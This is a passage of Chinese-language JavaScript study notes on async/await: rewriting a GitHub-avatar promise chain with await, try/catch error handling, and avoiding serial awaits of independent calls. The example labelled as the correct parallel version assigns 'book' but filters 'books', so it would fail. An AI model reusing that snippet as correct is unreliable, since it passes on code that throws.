text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">1. 我们需要用 await 替换掉 .then 的调用。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">2. 另外，我们需要在函数前面加上 async 关键字，使它们能工作</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">async function showAvatar() {</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  // 读取我们的 JSON</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let response =</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12px; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">await fetch('/article/promise-chaining/user.json');</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let user =</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12px; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">await response.json();</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  // 读取 github 用户信息</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="font-size: 12pt; box-sizing: border-box; -webkit-tap-highlight-color: transparent; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let githubResponse =</span><span style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><font style="font-size: 12pt;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">await fetch(`</span><span style="font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">https://api.github.com/users/</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">${user.name}`);</span></font></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let githubUser =</span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12px; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">await githubResponse.json();</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  // 显示头像</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  let img = document.createElement('img');</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  img.src = githubUser.avatar_url;</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  img.className = &quot;promise-avatar-example&quot;;</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  document.body.append(img);</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  // 等待 3 秒</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;"> </span><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;"> await new Promise((resolve, reject) =&gt; setTimeout(resolve, 3000));</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  img.remove();</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  return githubUser;</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">}</span></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="font-size: 12px; box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">showAvatar();</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div><br/></div><div><br/></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal; font-weight: bold;">添加错误处理</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; font-size: 12px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">async function myFetch() {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  try {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    let response = await fetch('coffee.jpg');</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    let myBlob = await response.blob();</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    let objectURL = URL.createObjectURL(myBlob);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    let image = document.createElement('img');</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    image.src = objectURL;</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    document.body.appendChild(image);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  } catch(e) {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    console.log(e);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  }</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">}</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">myFetch();</span></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">async/await 的缺点、陷阱与最佳实践（所以之前讲解的代码也有问题）</span></font></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><a href="https://juejin.im/post/6844903873992376334#heading-1" style="font-size: 12pt;">https://juejin.im/post/6844903873992376334#heading-1</a></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><a href="https://mp.weixin.qq.com/s/hqj-e50lbhVTdysi73Npmg" style="font-size: 12pt;">https://mp.weixin.qq.com/s/hqj-e50lbhVTdysi73Npmg</a></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><font style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">1、先安排任务，再 await，尽早安排异步I/O操作，但要尽可能晚地等待。</span></font></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async getBooksAndAuthor(authorId) {  </font></div><div><font style="font-size: 12pt;">    const books = await bookModel.fetchAll();  </font></div><div><font style="font-size: 12pt;">    const author = await authorModel.fetch(authorId);  </font></div><div><font style="font-size: 12pt;">    return {    </font></div><div><font style="font-size: 12pt;">        author,    </font></div><div><font style="font-size: 12pt;">        books: books.filter(book =&gt; book.authorId === authorId),  </font></div><div><font style="font-size: 12pt;">    };</font></div><div><font style="font-size: 12pt;">}</font></div></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;">这段代码看起来逻辑上没有问题。然而是不正确的。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;">1. await bookModel.fetchAll() 将会等待 fetchAll() 执行完。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;">2. 然后 await authorModel.fetch(authorId) 才会被执行。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">注意：</span></span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">对于某些实现，如果后面 await 的结果取决于前面的 await ，那就必须这样做。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;"><span style="font-size: 12pt; color: rgb(118, 0, 216); font-weight: bold;">当 authorModel.fetch(authorId) 并不依赖 bookModel.fetchAll() 的结果时，实际上他们可以并行执行。</span></span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;">然而，由于使用了 await 这两次调用就变成了串行的了，花费的总时间将会远超并行的方式。</span></div><div style="text-align: start;"><span style="font-size: 12pt;"><br/></span></div><div style="text-align: start;"><span style="font-size: 12pt;"><span style="font-size: 12pt; font-weight: bold;">以下是正确的使用方式：</span></span></div><div style="text-align: start;"><br/></div><div style="text-align: start;"><div style="box-sizing: border-box; padding: 8px; font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-size: 12px; color: rgb(51, 51, 51); border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15);-en-codeblock:true;"><div><font style="font-size: 12pt;">async getBooksAndAuthor(authorId) {  </font></div><div><font style="font-size: 12pt;">    const bookPromise = bookModel.fetchAll();  </font></div><div><font style="font-size: 12pt;">    const authorPromise = authorModel.fetch(authorId);  </font></div><div><font style="font-size: 12pt;">    const book = await bookPromise;  </font></div><div><font style="font-size: 12pt;">    const author = await authorPromise;  </font></div><div><font style="font-size: 12pt;">    return {    </font></div><div><font style="font-size: 12pt;">        author,    </font></div><div><font style="font-size: 12pt;">        books: books.filter(book =&gt; book.authorId === authorId),  </font></div><div><font style="font-size: 12pt;">    };</font></div><div><font style="font-size: 12pt;">}</font></div></div><div><br/></div></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><a href="https://developer.mozilla.org/zh-CN/docs/learn/JavaScript/%E5%BC%82%E6%AD%A5/Async_await" style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 238); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">https://developer.mozilla.org/zh-CN/docs/learn/JavaScript/%E5%BC%82%E6%AD%A5/Async_await</a></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; letter-spacing: normal; orphans: 2; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px; color: rgb(0, 0, 0); font-family: 微软雅黑; font-variant-caps: normal; font-variant-ligatures: normal;">每个 await 都要等待前一个 await 完成，而实际上你想要的是 promise 同时开始处理。</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px; font-size: medium; letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><br style="box-sizing: border-box; -webkit-tap-highlight-color: transparent;"/></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 8px; font-size: 12px; border-radius: 4px; background-color: rgb(251, 250, 248); border: 1px solid rgba(0, 0, 0, 0.15); letter-spacing: normal; orphans: 2; text-align: start; text-indent: 0px; text-transform: none; white-space: normal; widows: 2; word-spacing: 0px; -webkit-text-stroke-width: 0px;"><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">function timeoutPromise(interval) {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">  return new Promise((resolve, reject) =&gt; {</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    setTimeout(function(){</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">      resolve(&quot;done&quot;);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; font-size: 12pt; color: rgb(51, 51, 51); font-family: Monaco, Menlo, Consolas, &quot;Courier New&quot;, monospace; font-variant-caps: normal; font-variant-ligatures: normal;">    }, interval);</span></div><div style="box-sizing: border-box; -webkit-tap-highlight-color: transparent; margin: 0px; padding: 0px;"><span style="box-sizing: border-box; 